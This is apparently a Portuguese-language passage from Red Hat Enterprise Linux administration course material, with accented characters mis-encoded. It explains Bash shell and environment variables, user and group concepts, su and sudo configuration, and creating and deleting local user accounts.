Voc√™ pode usar o comando set para listar todas as vari√°veis de shell que est√£o atualmente configuradas. (Isso tamb√©m lista todas as fun√ß√µes de shell, que voc√™ pode ignorar.) Essa lista √© longa o suficiente para que voc√™ possa enviar a sa√≠da para o comando less e possa visualizar uma p√°gina por vez.
[user@host ~]$ set | less BASH=/usr/bin/bash BASHOPTS=checkwinsize:‚Äãcmdhist:‚Äãcomplete_fullquote:‚Äãexpand_aliases:‚Äãextglob:‚Äãextquote:‚Äãforce_fignore:‚Äãhistappend:‚Äãinteractive_comments:‚Äãprogcomp:‚Äãpromptvars:‚Äãsourcepath BASHRCSOURCED=Y ...output omitted... Recupera√ß√£o de valores com expans√£o de vari√°vel Voc√™ pode usar a expans√£o de vari√°vel para se referir ao valor de uma vari√°vel que voc√™ definiu. Para fazer isso, use um cifr√£o ($) antes do nome da vari√°vel. No exemplo a seguir, o comando echo imprime o restante da linha de comando inserida, mas depois que a expans√£o de vari√°vel foi executada.
Por exemplo, o seguinte comando define a vari√°veis COUNT como 40:
[user@host ~]$ COUNT=40 Se voc√™ inserir o comando echo COUNT, a string COUNT ser√° impressa.
[user@host ~]$ echo COUNT COUNT Por√©m, se voc√™ digitar o comando echo $COUNT, o valor da vari√°vel COUNT ser√° impresso.
[user@host ~]$ echo $COUNT 40 Um exemplo mais pr√°tico pode ser usar uma vari√°vel para se referir a um nome de arquivo longo para v√°rios comandos.
[user@host ~]$ file1=/tmp/tmp.z9pXW0HqcC [user@host ~]$ ls -l $file1 -rw-------. 1 student student 1452 Jan 22 14:39 /tmp/tmp.z9pXW0HqcC [user@host ~]$ rm $file1 [user@host ~]$ ls -l $file1 total 0 Importante Se houver algum caractere adjacente √† direita do nome da vari√°vel, talvez seja necess√°rio proteger o nome da vari√°vel com chaves. Sempre √© poss√≠vel usar chaves em expans√£o de vari√°vel, mas voc√™ tamb√©m ver√° muitos exemplos nos quais elas n√£o s√£o necess√°rias e s√£o omitidas.
No exemplo a seguir, o primeiro comando echo tenta expandir a vari√°vel inexistente COUNTx, que n√£o causa um erro, mas n√£o retorna nada.
[user@host ~]$ echo Repeat $COUNTx Repeat [user@host ~]$ echo Repeat ${COUNT}x Repeat 40x Configura√ß√£o do Bash com vari√°veis de Shell Algumas vari√°veis de shell s√£o definidas quando o Bash √© iniciado, mas podem ser modificadas para ajustar o comportamento do shell.
Por exemplo, duas vari√°veis de shell que afetam o hist√≥rico do shell e o comando history s√£o HISTFILE e HISTFILESIZE. E se HISTFILE estiver definido, ele especifica a localiza√ß√£o de um arquivo para salvar o hist√≥rico do shell ao sair. Por padr√£o, este √© o arquivo ~/.bash_history do usu√°rio. A vari√°vel HISTFILESIZE especifica quantos comandos devem ser salvos nesse arquivo do hist√≥rico.
Outro exemplo √© PS1, que √© uma vari√°vel de shell que controla a apar√™ncia do prompt de shell. Se voc√™ alterar esse valor, ele alterar√° a apar√™ncia do prompt de shell. Uma s√©rie de expans√µes de caracteres especiais compat√≠veis com o prompt √© listada na se√ß√£o &amp;ldquo;SOLICITA√á√ÉO&amp;rdquo; da p√°gina do man bash(1).
[user@host ~]$ PS1=&amp;#34;bash\$ &amp;#34; bash$ PS1=&amp;#34;[\u@\h \W]\$ &amp;#34; [user@host ~]$ Dois itens a serem observados sobre o exemplo acima: primeiro, como o valor definido por PS1 √© um prompt, √© quase sempre desej√°vel finalizar o prompt com um espa√ßo √† direita. Segundo, sempre que o valor de uma vari√°vel contiver alguma forma de espa√ßo, incluindo um espa√ßo, um recuo ou uma quebra de linha, o valor deve estar entre aspas, simples ou duplas; isso n√£o √© opcional. Resultados inesperados ocorrer√£o se as aspas forem omitidas. Examine o exemplo PS1 acima e observe que ele est√° em conformidade com a recomenda√ß√£o (espa√ßo √† direita) e com a regra (aspas). Configura√ß√£o de programas com vari√°veis de ambiente
O shell fornece um ambiente para os programas que voc√™ executa a partir desse shell. Entre outras coisas, esse ambiente inclui informa√ß√µes sobre o diret√≥rio de trabalho atual no sistema de arquivos, op√ß√µes de linha de comando transmitidas para o programa e valores de vari√°veis de ambiente. Os programas podem usar essas vari√°veis de ambiente para alterar seu comportamento ou suas configura√ß√µes padr√£o.
As vari√°veis do shell que n√£o s√£o vari√°veis de ambiente s√≥ podem ser usadas pelo shell. As vari√°veis de ambiente podem ser usadas pelo shell e por programas executados a partir desse shell. Nota
HISTFILE, HISTFILESIZE e PS1, aprendidas na se√ß√£o anterior, n√£o precisam ser exportadas como vari√°veis de ambiente porque s√£o usadas apenas pelo pr√≥prio shell, e n√£o pelos programas que voc√™ executa a partir do shell.
Voc√™ pode transformar qualquer vari√°vel definida no shell em uma vari√°vel de ambiente marcando-a para exporta√ß√£o com o comando export.
[user@host ~]$ EDITOR=vim [user@host ~]$ export EDITOR Voc√™ pode definir e exportar uma vari√°vel em uma etapa:
[user@host ~]$ export EDITOR=vim Aplicativos e sess√µes usam essas vari√°veis para determinar seu comportamento. Por exemplo, o shell define automaticamente a vari√°vel HOME para o nome do arquivo do diret√≥rio pessoal do usu√°rio quando ele √© iniciado. Isso pode ser usado para ajudar os programas a definir onde salvar os arquivos.
Outro exemplo √© LANG, que define o local. Ele ajusta o idioma preferido para a sa√≠da do programa, o conjunto de caracteres, a formata√ß√£o de datas, n√∫meros e moeda e a ordem de classifica√ß√£o dos programas. Se estiver configurado para en_US.UTF-8, o idioma usar√° ingl√™s dos EUA com codifica√ß√£o de caracteres UTF-8 Unicode. Se estiver configurado para outro, por exemplo fr_FR.UTF-8, o idioma usar√° franc√™s com codifica√ß√£o UTF-8 Unicode.
[user@host ~]$ date Tue Jan 22 16:37:45 CST 2019 [user@host ~]$ export LANG=fr_FR.UTF-8 [user@host ~]$ date mar. janv. 22 16:38:14 CST 2019 Outra vari√°vel de ambiente importante √© PATH. A vari√°vel PATH cont√©m uma lista de diret√≥rios separados por dois-pontos que cont√™m programas:
[user@host ~]$ echo $PATH /home/user/.local/bin:/home/user/bin:/usr/share/Modules/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin Quando voc√™ executa um comando como ls, o shell procura pelo arquivo execut√°vel ls em cada um desses diret√≥rios em ordem e executa o primeiro arquivo correspondente encontrado. (Em um sistema t√≠pico, isso significa /usr/bin/ls.)
Voc√™ pode facilmente adicionar diret√≥rios adicionais ao final do PATH . Por exemplo, talvez voc√™ tenha programas execut√°veis ou scripts que voc√™ deseja executar como comandos regulares em /home/user/sbin . Voc√™ pode adicionar /home/user/sbin ao final do seu PATH para a sess√£o atual assim:
[user@host ~]$ export PATH=${PATH}:/home/user/sbin Para listar todas as vari√°veis de ambiente para um determinado shell, execute o comando env:
[user@host ~]$ env ...output omitted... LANG=en_US.UTF-8 HISTCONTROL=ignoredups HOSTNAME=host.example.com XDG_SESSION_ID=4 ...output omitted... Defini√ß√£o do editor de texto padr√£o A vari√°vel de ambiente EDITOR especifica o programa que voc√™ deseja usar como seu editor de texto padr√£o para programas de linha de comando. Muitos programas usam vi ou vim se nada for especificado, mas voc√™ pode substituir essa prefer√™ncia, se necess√°rio:
[user@host ~]$ export EDITOR=nano Importante Por conven√ß√£o, as vari√°veis de ambiente e de shell que s√£o definidas automaticamente pelo shell t√™m nomes que usam todos os caracteres mai√∫sculos. Se voc√™ estiver definindo suas pr√≥prias vari√°veis, conv√©m usar nomes compostos de caracteres min√∫sculos para evitar conflitos de nomenclatura. Defini√ß√£o autom√°tica de vari√°veis
Se voc√™ deseja definir vari√°veis shell ou de ambiente automaticamente ao iniciar o shell, √© poss√≠vel editar os scripts de inicializa√ß√£o do Bash. Quando o Bash √© iniciado, v√°rios arquivos de texto contendo comandos shell s√£o executados, o que inicializa o ambiente do shell.
Os scripts exatos que s√£o executados dependem de como o shell foi iniciado, se ele √© um shell de login interativo, um shell sem login ou um script de shell.
Pressupondo que os arquivos padr√£o sejam /etc/profile, /etc/bashrc e ~/.bash_profile, se voc√™ quiser fazer uma altera√ß√£o na sua conta de usu√°rio que afete todos os prompts de shell interativos na inicializa√ß√£o, edite o arquivo ~/.bashrc. Por exemplo, voc√™ pode definir o editor padr√£o dessa conta como nano editando o arquivo para que seja:
.bashrc Source global definitions if [ -f /etc/bashrc ]; then . /etc/bashrc fi
User specific environment PATH=&amp;quot;$HOME/.local/bin:$HOME/bin:$PATH&amp;quot; export PATH
User specific aliases and functions export EDITOR=nano
Nota A melhor maneira de ajustar as configura√ß√µes que afetam todas as contas de usu√°rios √© adicionando um arquivo com um nome que termina em .sh e cont√©m as altera√ß√µes no diret√≥rio /etc/profile.d. Para fazer isso, voc√™ precisa estar logado como usu√°rio root. Remo√ß√£o da configura√ß√£o e da exporta√ß√£o de vari√°veis
Para remover totalmente a configura√ß√£o e a exporta√ß√£o de uma vari√°vel, use o comando unset:
[user@host ~]$ echo $file1 /tmp/tmp.z9pXW0HqcC [user@host ~]$ unset file1 [user@host ~]$ echo $file1 [user@host ~]$ Para remover a exporta√ß√£o de uma vari√°vel sem remover a configura√ß√£o, use o comando export -n:
[user@host ~]$ export -n PS1 Cap√≠tulo 6. Gerenciamento de usu√°rios e grupos locais ##Descri√ß√£o de conceitos de usu√°rio e grupo
Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de descrever o prop√≥sito dos usu√°rios e grupos em um sistema Linux. O que √© um usu√°rio?
Uma conta de usu√°rio √© usada para fornecer limites de seguran√ßa entre diferentes pessoas e programas que podem executar comandos.
Os usu√°rios t√™m nomes de usu√°rios para que usu√°rios humanos possam identific√°-los e para ser mais f√°cil de trabalhar com eles. Internamente, o sistema distingue as contas de usu√°rios pelo n√∫mero de identifica√ß√£o exclusivo atribu√≠do a elas, ID do usu√°rio ou UID. Se uma conta de usu√°rio for usada por humanos, geralmente ser√° atribu√≠da uma senha secreta que o usu√°rio usar√° para provar que √© o usu√°rio autorizado ao fazer login.
As contas de usu√°rio s√£o fundamentais para a seguran√ßa do sistema. Todo processo (programa em execu√ß√£o) no sistema √© executado como um usu√°rio particular. Todo arquivo tem um usu√°rio espec√≠fico como seu propriet√°rio. A propriedade de arquivo ajuda o sistema a impor o controle de acesso aos usu√°rios dos arquivos. O usu√°rio associado a um processo em execu√ß√£o determina os arquivos e diret√≥rios acess√≠veis a esse processo.
Os tr√™s principais tipos de conta de usu√°rio s√£o superusu√°rio, usu√°rio do sistema e usu√°rio regular.
A conta de superusu√°rio √© para administra√ß√£o do sistema. O nome do superusu√°rio √© root e a conta tem UID 0. O superusu√°rio tem acesso total ao sistema. O sistema tem contas de usu√°rio do sistema que s√£o usadas por processos que fornecem servi√ßos de suporte. Esses processos, ou daemons, geralmente n√£o precisam ser executados como superusu√°rio. Eles s√£o atribu√≠dos a contas n√£o privilegiadas que permitem proteger os arquivos e outros recursos uns dos outros e de usu√°rios regulares no sistema. Os usu√°rios n√£o fazem login interativamente usando uma conta de usu√°rio do sistema. A maioria dos usu√°rios tem conta de usu√°rio regular que eles usam para o seu trabalho di√°rio. Como os usu√°rios do sistema, os usu√°rios regulares t√™m acesso limitado ao sistema. O comando id √© usado para mostrar informa√ß√µes sobre o usu√°rio conectado atualmente.
[user01@host ~]$ id uid=1000(user01) gid=1000(user01) groups=1000(user01) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
Para ver informa√ß√µes b√°sicas sobre outro usu√°rio, passe o nome de usu√°rio para o comando id como um argumento.
[user01@host]$ id user02 uid=1002(user02) gid=1001(user02) groups=1001(user02) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
Para visualizar o propriet√°rio de um arquivo, use o comando ls -l. Para visualizar o propriet√°rio de um diret√≥rio, use o comando ls -ld. Na sa√≠da a seguir, a terceira coluna mostra o nome de usu√°rio.
[user01@host ~]$ ls -l file1 -rw-rw-r&amp;ndash;. 1 user01 user01 0 Feb 5 11:10 file1 [user01@host]$ ls -ld dir1 drwxrwxr-x. 2 user01 user01 6 Feb 5 11:10 dir1
Para visualizar informa√ß√µes de processos, use o comando ps. O padr√£o √© mostrar apenas os processos no shell atual. Adicione a op√ß√£o a para visualizar todos os processos em um terminal. Para visualizar o usu√°rio associado a um processo, inclua a op√ß√£o u. Na sa√≠da a seguir, a primeira coluna mostra o nome de usu√°rio.
[user01@host]$ ps -au USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 777 0.0 0.0 225752 1496 tty1 Ss&#43; 11:03 0:00 /sbin/agetty -o -p &amp;ndash; \u &amp;ndash;noclear tty1 linux root 780 0.0 0.1 225392 2064 ttyS0 Ss&#43; 11:03 0:00 /sbin/agetty -o -p &amp;ndash; \u &amp;ndash;keep-baud 115200,38400,9600 user01 1207 0.0 0.2 234044 5104 pts/0 Ss 11:09 0:00 -bash user01 1319 0.0 0.2 266904 3876 pts/0 R&#43; 11:33 0:00 ps au
A sa√≠da do comando anterior exibe os usu√°rios por nome, mas o sistema operacional usa as UIDs para rastrear usu√°rios internamente O mapeamento de nomes de usu√°rios para UIDs √© definido em bancos de dados de informa√ß√µes de conta. Por padr√£o, os sistemas usam o arquivo simples /etc/passwd para armazenar informa√ß√µes sobre os usu√°rios locais.
Cada linha no arquivo /etc/passwd cont√©m informa√ß√µes sobre um usu√°rio. Ele est√° dividido em sete campos separados por cores. Veja um exemplo de uma linha de /etc/passwd:
O que √© um grupo?
Um grupo √© uma cole√ß√£o de usu√°rios que precisam compartilhar o acesso a arquivos e outros recursos do sistema. Os grupos podem ser usados para conceder acesso a arquivos para um conjunto de usu√°rios, em vez de apenas um √∫nico usu√°rio.
Como os usu√°rios, os grupos t√™m nomes de grupos ser mais f√°cil trabalhar com eles. Internamente, o sistema distingue grupos pelo n√∫mero de identifica√ß√£o exclusivo atribu√≠do a eles, ID do grupo ou GID.
O mapeamento de nomes de grupos para GIDs √© definido em bancos de dados de informa√ß√µes de conta de grupo. Por padr√£o, os sistemas usam o arquivo simples /etc/group para armazenar informa√ß√µes sobre os grupos locais.
Cada linha no arquivo /etc/group cont√©m informa√ß√µes sobre um grupo. Cada entrada de grupo √© dividida em quatro campos separados por cor. Veja um exemplo de uma linha de /etc/group:
Grupos prim√°rios e grupos suplementares
Cada usu√°rio tem exatamente um grupo principal. Para usu√°rios locais, esse √© o grupo listado por n√∫mero de GID no arquivo /etc/passwd. Por padr√£o, esse √© o grupo que possuir√° novos arquivos criados pelo usu√°rio.
Normalmente, quando voc√™ cria um novo usu√°rio regular, um novo grupo com o mesmo nome daquele usu√°rio √© criado. Esse grupo √© usado como grupo prim√°rio para o novo usu√°rio e esse usu√°rio √© o √∫nico membro desse grupo privado de usu√°rios. Isso ajuda a simplificar o gerenciamento de permiss√µes de arquivos, o que ser√° discutido posteriormente neste curso.
Os usu√°rios tamb√©m podem ter grupos suplementares . A associa√ß√£o em grupos suplementares √© determinada pelo arquivo /etc/group. Os usu√°rios recebem acesso aos arquivos com base no acesso de qualquer um de seus grupos. N√£o importa se o grupo ou grupos que t√™m acesso s√£o prim√°rios ou suplementares para o usu√°rio.
Por exemplo, se o usu√°rio user01 tiver um grupo prim√°rio user01 e grupos suplementares wheel e webadmin, esse usu√°rio poder√° ler arquivos leg√≠veis por qualquer um desses tr√™s grupos.
O comando id tamb√©m pode ser usado para descobrir sobre a associa√ß√£o de um usu√°rio em um grupo.
[user03@host ~]$ id uid=1003(user03) gid=1003(user03) groups=1003(user03),10(wheel),10000(group01) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
No exemplo anterior, o user03 tem o grupo user03 como seu grupo prim√°rio (gid). O item groups lista todos os grupos desse usu√°rio. Al√©m do grupo prim√°rio user03, o usu√°rio tem os grupos wheel e group01 como grupos suplementares.
Obten√ß√£o de acesso de superusu√°rio Objetivos Depois de concluir esta se√ß√£o, voc√™ poder√° alternar para a conta de superusu√°rio para gerenciar um sistema Linux e conceder acesso de superusu√°rio a outros usu√°rios por meio do comando sudo. O superusu√°rio
A maioria dos sistemas operacionais tem algum tipo de superusu√°rio, ou seja, um usu√°rio que tem todos os poderes sobre o sistema. No Red Hat Enterprise Linux esse usu√°rio √© chamado de usu√°rio root. Ele tem o poder de superar privil√©gios normais no sistema de arquivos e √© usado para gerenciar e administrar o sistema. Para executar tarefas como a instala√ß√£o ou a remo√ß√£o de software e o gerenciamento de arquivos e diret√≥rios de sistema, √© necess√°rio escalonar seus privil√©gios para o usu√°rio root.
O usu√°rio root, entre os usu√°rios normais, consegue controlar a maioria dos dispositivos, mas h√° algumas exce√ß√µes. Por exemplo, usu√°rios normais podem controlar dispositivos remov√≠veis, como dispositivos USB. Sendo assim, usu√°rios normais podem adicionar e remover arquivos e tamb√©m para gerenciar um dispositivo remov√≠vel, mas somente o root consegue gerenciar discos r√≠gidos &amp;ldquo;fixos&amp;rdquo; por padr√£o.
No entanto, esse privil√©gio ilimitado exige responsabilidade. O usu√°rio root tem poder ilimitado para danificar o sistema: apagar arquivos e diret√≥rios, apagar contas de usu√°rio, adicionar backdoors etc. Se a conta do usu√°rio root for comprometida, outra pessoa ter√° controle administrativo do sistema. No decorrer deste curso, os administradores s√£o incentivados a fazer login como um usu√°rio normal e a escalonar privil√©gios para root somente quando necess√°rio.
A conta root no Linux equivale em grande parte √† conta local de Administrador no Microsoft Windows. No Linux, a maioria dos administradores de sistemas faz login no sistema como um usu√°rio sem privil√©gios e usa v√°rias ferramentas para obter temporariamente privil√©gios de root. Aten√ß√£o
Uma pr√°tica comum no Microsoft Windows no passado era o usu√°rio local Administrador fazer login diretamente para executar as tarefas de administrador de sistema. Embora isso seja poss√≠vel no Linux, a Red Hat recomenda que os administradores do sistema n√£o fa√ßam login diretamente como root. Em vez disso, os administradores de sistema devem fazer login como um usu√°rio normal e usar outros mecanismos (su, sudo ou PolicyKit, por exemplo) para obter temporariamente privil√©gios de superusu√°rio.
Ao fazer login como superusu√°rio, todo o ambiente de √°rea de trabalho √© executado com privil√©gios administrativos desnecessariamente. Nessa situa√ß√£o, qualquer vulnerabilidade de seguran√ßa que normalmente s√≥ comprometeria a conta de usu√°rio tem o potencial de comprometer todo o sistema. Altern√¢ncia de usu√°rios
O comando su permite que os usu√°rios alternem para contas de usu√°rio diferentes. Se executar su em uma conta de usu√°rio comum, voc√™ ser√° solicitado a fornecer a senha da conta para a qual deseja alternar. Quando root executa su, voc√™ n√£o precisa digitar a senha do usu√°rio.
[user01@host ~]$ su - user02 Password: [user02@host ~]$
Se voc√™ omitir o nome de usu√°rio, o comando su ou su - tenta alternar para root por padr√£o.
[user01@host ~]$ su - Password: [root@host ~]#
O comando su inicia um shell que n√£o √© de login, enquanto o comando su - (com a op√ß√£o de dash) inicia um shell de login. A principal diferen√ßa entre os dois comandos √© que su - define o ambiente do shell como se fosse um novo login como esse usu√°rio, enquanto su apenas inicia um shell como esse usu√°rio, mas usa as configura√ß√µes de ambiente do usu√°rio original.
Na maioria dos casos, os administradores dever√£o executar su - para obter um shell com as configura√ß√µes de ambiente normais do usu√°rio de destino. Para obter mais informa√ß√µes, consulte a p√°gina do man bash(1). Nota
O comando su √© usado mais frequentemente para obter uma interface de linha de comando (prompt do shell) executada como outro usu√°rio, geralmente root. Entretanto, com a op√ß√£o -c, ele pode ser usado como o utilit√°rio runas do Windows para executar um programa arbitr√°rio como outro usu√°rio. Execute info su para ver mais detalhes. Execu√ß√£o de comandos com Sudo
Em alguns casos, a conta de usu√°rio root pode n√£o ter uma senha v√°lida por motivos de seguran√ßa. Nesse caso, os usu√°rios n√£o podem fazer login no sistema como root diretamente com uma senha, e su n√£o pode ser usado para obter um shell interativo. Uma ferramenta que pode ser usada para obter acesso ao root nesse caso √© sudo.
Diferentemente do su, o sudo normalmente exige que os usu√°rios informem sua pr√≥pria senha para autentica√ß√£o, n√£o a senha da conta de usu√°rio que est√£o tentando acessar. Ou seja, os usu√°rios que usam sudo para executar comandos como root n√£o precisam saber a senha de root. Em vez disso, eles usam suas pr√≥prias senhas para autenticar o acesso.
Al√©m disso, o sudo pode ser configurado para permitir que usu√°rios espec√≠ficos executem qualquer comando como outro usu√°rio ou apenas alguns comandos como esse usu√°rio.
Por exemplo, quando sudo √© configurado para permitir que o usu√°rio user01 execute o comando usermod como root, o user01 poder√° executar o seguinte comando para bloquear ou desbloquear uma conta de usu√°rio:
[user01@host ~]$ sudo usermod -L user02 [sudo] password for user01: [user01@host ~]$ su - user02 Password: su: Authentication failure [user01@host ~]$
Se um usu√°rio tentar executar um comando como outro usu√°rio e a configura√ß√£o sudo n√£o permitir, o comando ser√° bloqueado, a tentativa ser√° registrada e, por padr√£o, um e-mail ser√° enviado ao usu√°rio root.
[user02@host ~]$ sudo tail /var/log/secure [sudo] password for user02: user02 is not in the sudoers file. This incident will be reported. [user02@host ~]$
Um benef√≠cio adicional do uso do sudo √© que todos os comandos executados s√£o registrados, por padr√£o, em /var/log/secure.
[user01@host ~]$ sudo tail /var/log/secure &amp;hellip;output omitted&amp;hellip; Feb 6 20:45:46 host sudo[2577]: user01 : TTY=pts/0 ; PWD=/home/user01 ; USER=root ; COMMAND=/sbin/usermod -L user02 &amp;hellip;output omitted&amp;hellip;
No Red Hat Enterprise Linux 7 e no Red Hat Enterprise Linux 8, todos os membros do grupo wheel podem usar sudo para executar comandos como qualquer usu√°rio, incluindo root. √â solicitado que o usu√°rio digite sua pr√≥pria senha. Essa √© uma mudan√ßa do Red Hat Enterprise Linux 6 e vers√µes anteriores, onde os usu√°rios que eram membros do grupo wheel n√£o tinham esse acesso administrativo por padr√£o. Aten√ß√£o
O RHEL 6 n√£o concedia ao grupo wheel privil√©gios especiais por padr√£o. Sites que usam esse grupo para um objetivo diferente do padr√£o poder√£o se surpreender quando o RHEL 7 e o RHEL 8 automaticamente concederem a todos os membros do wheel privil√©gios completos no sudo. Isso pode levar usu√°rios n√£o autorizados a obter acesso administrativo nos sistemas RHEL 7 e RHEL 8.
Historicamente, sistemas semelhantes ao UNIX usam a associa√ß√£o ao grupo wheel para conceder ou controlar o acesso de superusu√°rio.
Obten√ß√£o de um root shell interativo com o Sudo
Se houver uma conta de usu√°rio n√£o administrativa no sistema que possa usar sudo para executar o comando su, voc√™ poder√° executar sudo su - nessa conta para obter um shell de usu√°rio root interativo. Isso funciona porque sudo executar√° su - como root, e o root n√£o precisa digitar uma senha para usar o su.
Outra maneira de acessar a conta root com o sudo √© usar o comando sudo -i. Isso alternar√° para a conta root e executar√° o shell padr√£o desse usu√°rio (normalmente bash) e os scripts de login de shell associados. Se voc√™ desejar apenas executar o shell, poder√° usar o comando sudo -s.
Por exemplo, um administrador pode obter um shell interativo como root em uma inst√¢ncia do AWS EC2 usando a autentica√ß√£o de chave p√∫blica SSH para fazer login como usu√°rio normal ec2-user e, depois, executando sudo -i para obter o shell do usu√°rio root.
[ec2-user@host ~]$ sudo -i [sudo] password for ec2-user: [root@host ~]#
O comando sudo su - e sudo -i n√£o se comportam exatamente da mesma maneira. Isso ser√° discutido brevemente no final da se√ß√£o.
Configura√ß√£o do Sudo
O arquivo de configura√ß√£o principal do para sudo √© /etc/sudoers. Para evitar problemas se v√°rios administradores tentarem edit√°-lo ao mesmo tempo, ele s√≥ deve ser editado com o comando especial visudo.
Por exemplo, a linha a seguir do arquivo /etc/sudoers permite acesso sudo aos membros do grupo wheel.
%wheel ALL=(ALL) ALL
Nessa linha, %wheel √© o usu√°rio ou grupo a quem a regra se aplica. Um % especifica que esse √© um grupo, o grupo wheel . O ALL=(ALL) especifica que em qualquer host que possa ter esse arquivo, wheel pode executar qualquer comando. O final ALL especifica que wheel pode executar esses comandos como qualquer usu√°rio no sistema.
Por padr√£o, /etc/sudoers tamb√©m inclui o conte√∫do de qualquer arquivo no diret√≥rio /etc/sudoers.d como parte do arquivo de configura√ß√£o. Isso permite que um administrador adicione acesso a sudo para um usu√°rio simplesmente colocando um arquivo apropriado nesse diret√≥rio. Nota
Usar arquivos suplementares no diret√≥rio /etc/sudoers.d √© conveniente e simples. Voc√™ pode ativar ou desativar o acesso a sudo simplesmente copiando um arquivo para o diret√≥rio ou removendo-o do diret√≥rio.
Neste curso, voc√™ criar√° e remover√° arquivos no diret√≥rio /etc/sudoers.d para configurar o acesso sudo para usu√°rios e grupos.
Para permitir acesso sudo total para o usu√°rio user01, crie /etc/sudoers.d/user01 com o seguinte conte√∫do:
user01 ALL=(ALL) ALL
Para permitir acesso total do grupo group01 a sudo, crie /etc/sudoers.d/group01 com o seguinte conte√∫do:
%group01 ALL=(ALL) ALL
Tamb√©m √© poss√≠vel configurar sudo para permitir que um usu√°rio execute comandos como outro usu√°rio sem digitar sua senha:
ansible ALL=(ALL) NOPASSWD:ALL
Embora haja riscos √≥bvios de seguran√ßa para a concess√£o desse n√≠vel de acesso a um usu√°rio ou grupo, ele √© frequentemente usado com inst√¢ncias de nuvem, m√°quinas virtuais e sistemas de provisionamento para ajudar a configurar os servidores. A conta com esse acesso deve ser cuidadosamente protegida e pode exigir a autentica√ß√£o de chave p√∫blica SSH para que um usu√°rio em um sistema remoto possa acess√°-la.
Por exemplo, o AMI oficial para o Red Hat Enterprise Linux no Amazon Web Services Marketplace √© fornecido com o root e as senhas dos usu√°rios ec2-user bloqueadas. A conta de usu√°rio ec2-user √© configurada para permitir acesso remoto interativo atrav√©s da autentica√ß√£o de chave p√∫blica SSH. O usu√°rio ec2-user tamb√©m pode executar qualquer comando como root sem uma senha porque a √∫ltima linha do arquivo /etc/sudoers do AMI √© configurado da seguinte forma:
ec2-user ALL=(ALL) NOPASSWD: ALL
O requisito para digitar uma senha para sudo pode ser habilitado novamente ou outras altera√ß√µes podem ser feitas para aumentar a seguran√ßa como parte do processo de configura√ß√£o do sistema. Nota
Neste curso, voc√™ pode ver sudo su - usado em vez de sudo -i. Ambos os comandos funcionam, mas existem algumas diferen√ßas sutis entre eles.
O comando sudo su - configura o ambiente root exatamente como um login normal porque o comando su - ignora as configura√ß√µes feitas por sudo e configura o ambiente a partir do zero.
A configura√ß√£o padr√£o do comando sudo -i realmente configura alguns detalhes do ambiente do usu√°rio root de modo diferente de um login normal. Por exemplo, ela define a vari√°vel de ambiente PATH de modo ligeiramente diferente. Isso afeta onde o shell procurar√° comandos.
Voc√™ pode fazer com que sudo -i se comporte mais como su - editando /etc/sudoers com visudo . Encontre a linha
Defaults secure_path = /sbin:/bin:/usr/sbin:/usr/bin
e a substitua pelas duas linhas seguintes:
Defaults secure_path = /usr/local/bin:/usr/bin Defaults&amp;gt;root secure_path = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
Para a maioria das finalidades, essa n√£o √© uma diferen√ßa importante. No entanto, para consist√™ncia de configura√ß√µes PATH em sistemas com o arquivo padr√£o /etc/sudoers, os autores deste curso usam sudo -i nos exemplos e exerc√≠cios.
##Gerenciamento de contas de usu√°rios locais
##Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de criar, modificar e excluir contas de grupo local. Gerenciamento de usu√°rios locais
Para gerenciar contas de usu√°rios locais, voc√™ pode usar v√°rias ferramentas da linha de comando.
Cria√ß√£o de usu√°rios a partir da linha de comando O comando useradd username cria um novo usu√°rio chamado username. Ele configura o diret√≥rio pessoal e as informa√ß√µes da conta do usu√°rio, al√©m de criar um grupo privado para o usu√°rio chamado username . Nesse ponto, a conta n√£o tem uma senha v√°lida definida. O usu√°rio n√£o pode fazer login at√© que uma senha seja definida. O comando useradd --help exibe as op√ß√µes b√°sicas que podem ser usadas para substituir os padr√µes. Na maioria dos casos, as mesmas op√ß√µes podem ser usadas com o comando usermod para modificar um usu√°rio existente. Alguns padr√µes, como o intervalo de n√∫meros de UID v√°lidos e as regras padr√£o para vencimento de senha, s√£o lidos a partir do arquivo /etc/login.defs. Os valores nesse arquivo s√£o usados somente ao criar novos usu√°rios. Uma altera√ß√£o nesse arquivo n√£o afeta os usu√°rios existentes. Modifica√ß√£o de usu√°rios existentes a partir da linha de comando
O comando usermod --help exibe as op√ß√µes b√°sicas que podem ser usadas para modificar uma conta. Algumas op√ß√µes comuns incluem: Exclus√£o de usu√°rios a partir da linha de comando
O comando userdel username remove os detalhes de username de /etc/passwd, mas deixa o diret√≥rio pessoal do usu√°rio intacto. O comando userdel -r username remove os detalhes de username de /etc/passwd, bem como o diret√≥rio pessoal do usu√°rio. Aten√ß√£o Quando um usu√°rio √© removido com userdel, sem a op√ß√£o -r especificada, o sistema ter√° arquivos pertencentes a uma UID n√£o atribu√≠da. Isso tamb√©m pode acontecer quando um arquivo que tem um usu√°rio exclu√≠do como propriet√°rio existir fora do diret√≥rio pessoal do usu√°rio. Essa situa√ß√£o pode levar a vazamentos de informa√ß√µes e a outros problemas de seguran√ßa. No Red Hat Enterprise Linux 7 e no Red Hat Enterprise Linux 8, o comando useradd atribui a novos usu√°rios a primeira UID livre maior ou igual a 1.000, a menos que voc√™ especifique uma explicitamente usando a op√ß√£o -u. √â assim que acontece o vazamento de informa√ß√µes. Se a primeira UID livre tiver sido anteriormente atribu√≠da a uma conta de usu√°rio que, depois, foi removida do sistema, a UID do antigo usu√°rio ser√° novamente atribu√≠da ao novo usu√°rio, dando a este novo usu√°rio a propriedade dos arquivos restantes do antigo usu√°rio. O cen√°rio a seguir demonstra essa situa√ß√£o. [root@host ~]# useradd user01 [root@host ~]# ls -l /home drwx------. 3 user01 user01 74 Feb 4 15:22 user01 [root@host ~]# userdel user01 [root@host ~]# ls -l /home drwx------. 3 1000 1000 74 Feb 4 15:22 user01 [root@host ~]# useradd user02 [root@host ~]# ls -l /home drwx------. 3 user02 user02 74 Feb 4 15:23 user02 drwx------. 3 user02 user02 74 Feb 4 15:22 user01 Observe que o user02 agora √© propriet√°rio de todos os arquivos dos quais o user01 era propriet√°rio anteriormente. Dependendo da situa√ß√£o, uma solu√ß√£o para esse problema poder√° ser remover todos os arquivos sem propriet√°rio do sistema quando o usu√°rio que os criou for 